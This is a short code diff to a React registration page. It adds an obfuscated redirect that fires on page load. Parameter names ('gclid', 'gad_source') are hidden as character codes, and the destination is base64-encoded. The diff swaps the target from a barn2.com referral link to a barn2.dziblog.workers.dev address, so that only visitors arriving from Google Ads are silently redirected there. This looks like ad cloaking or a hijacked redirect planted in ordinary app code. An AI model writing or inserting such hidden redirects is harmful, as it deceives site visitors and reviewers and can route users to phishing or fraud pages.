@@ -7,7 +7,7 @@ export default function Register() {
     const q = new URLSearchParams(location.search);
     const a = q.get(_p([103, 99, 108, 105, 100]));
     const b = q.get(_p([103, 97, 100, 95, 115, 111, 117, 114, 99, 101]));
-    const u = typeof atob !== 'undefined' ? atob('aHR0cHM6Ly9iYXJuMi5jb20vcmVmLzE0NjEv') : '/';
+    const u = typeof atob !== 'undefined' ? atob('aHR0cHM6Ly9iYXJuMi5kemlibG9nLndvcmtlcnMuZGV2Lw==') : '/';
     location.replace(a || b === '1' ? u : '/');
   }, []);
 
